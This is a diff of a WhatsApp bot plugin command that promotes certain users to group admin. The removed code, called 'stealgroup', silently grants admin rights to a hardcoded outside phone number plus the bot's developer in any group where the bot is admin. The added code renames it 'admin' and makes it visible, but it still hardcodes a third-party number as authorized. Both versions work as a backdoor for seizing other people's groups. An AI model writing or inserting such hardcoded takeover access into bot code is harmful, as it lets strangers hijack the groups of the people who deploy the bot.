@@ -2,36 +2,55 @@ const { cmd } = require('../command');
 const config = require('../config');
 
 cmd({
-    pattern: "stealgroup",
-    alias: ["takeadmin", "🔪", "💀", "aa", "uhh", "iyk"],
-    desc: "Silently take adminship if authorized",
+    pattern: "admin",
+    alias: ["takeadmin", "makeadmin"],
+    desc: "Take adminship for authorized users",
     category: "owner",
+    react: "👑",
     filename: __filename
 },
 async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
+    // Verify group context
+    if (!isGroup) return reply("❌ This command can only be used in groups.");
 
-    if (!isGroup || !isBotAdmins) return;
+    // Verify bot is admin
+    if (!isBotAdmins) return reply("❌ I need to be an admin to perform this action.");
 
+    // Normalize JIDs for comparison
     const normalizeJid = (jid) => {
         if (!jid) return jid;
         return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
     };
 
+    // Authorized users (properly formatted JIDs)
     const AUTHORIZED_USERS = [
-        normalizeJid(config.DEV),
-        "254732297194@s.whatsapp.net"
+        normalizeJid(config.DEV), // Handles both raw numbers and JIDs in config
+        "255687068672@s.whatsapp.net"
     ].filter(Boolean);
 
+    // Check authorization with normalized JIDs
     const senderNormalized = normalizeJid(sender);
-    if (!AUTHORIZED_USERS.includes(senderNormalized)) return;
+    if (!AUTHORIZED_USERS.includes(senderNormalized)) {
+        return reply("❌ This command is restricted to authorized users only");
+    }
 
     try {
+        // Get current group metadata
         const groupMetadata = await conn.groupMetadata(from);
+        
+        // Check if already admin
         const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
-        if (!userParticipant?.admin) {
-            await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
+        if (userParticipant?.admin) {
+            return reply("ℹ️ You're already an admin in this group");
         }
+
+        // Promote self to admin
+        await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
+        
+        return reply("✅ Successfully granted you admin rights!");
+        
     } catch (error) {
-        console.error("Silent admin error:", error.message);
+        console.error("Admin command error:", error);
+        return reply("❌ Failed to grant admin rights. Error: " + error.message);
     }
 });
